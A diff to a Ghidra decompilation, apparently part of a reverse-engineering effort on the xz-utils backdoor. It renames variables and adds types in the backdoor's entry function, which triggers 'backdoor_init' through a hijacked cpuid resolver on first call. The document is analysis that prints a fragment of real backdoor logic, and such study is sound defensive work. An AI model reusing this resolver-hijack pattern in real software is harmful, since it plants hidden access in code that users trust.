@@ -1,7 +1,7 @@
 // /home/kali/xzre-ghidra/xzregh/10A720_backdoor_entry.c
 // Function: backdoor_entry @ 0x10A720
-// Calling convention: unknown
-// Prototype: undefined backdoor_entry(void)
+// Calling convention: __stdcall
+// Prototype: uint __stdcall backdoor_entry(uint cpuid_request, u64 * caller_frame)
 
 
 /*
@@ -13,33 +13,27 @@
 #include "xzre_types.h"
 
 
-undefined4 backdoor_entry(undefined4 param_1,undefined8 param_2)
+uint backdoor_entry(uint cpuid_request,u64 *caller_frame)
 
 {
-  undefined8 uVar1;
-  undefined4 c;
-  undefined1 d [4];
-  undefined1 state [4];
-  undefined8 local_48;
-  undefined8 local_40;
-  undefined8 local_38;
-  undefined8 local_30;
-  undefined8 local_28;
-  undefined8 local_20;
+  elf_entry_ctx_t state;
+  u32 d;
+  u32 a;
+  u32 b;
+  u32 c;
+  elf_entry_ctx_t local_48;
   
-  uVar1 = 0;
   if (resolver_call_count == 1) {
-    local_48 = 1;
-    local_40 = 0;
-    local_38 = 0;
-    local_30 = 0;
-    local_28 = 0;
-    local_20 = param_2;
-    backdoor_init(&local_48);
-    uVar1 = param_2;
+    local_48.symbol_ptr = (void *)0x1;
+    local_48.got_ctx.got_ptr = (void *)0x0;
+    local_48.got_ctx.return_address = (void *)0x0;
+    local_48.got_ctx.cpuid_fn = (void *)0x0;
+    local_48.got_ctx.got_offset = 0;
+    local_48.frame_address = caller_frame;
+    backdoor_init(&local_48,caller_frame);
   }
   resolver_call_count = resolver_call_count + 1;
-  _cpuid_gcc(param_1,&c,d,state,&local_48,uVar1);
-  return c;
+  _cpuid_gcc(cpuid_request,&a,&b,&c,(uint *)&local_48);
+  return a;
 }
 
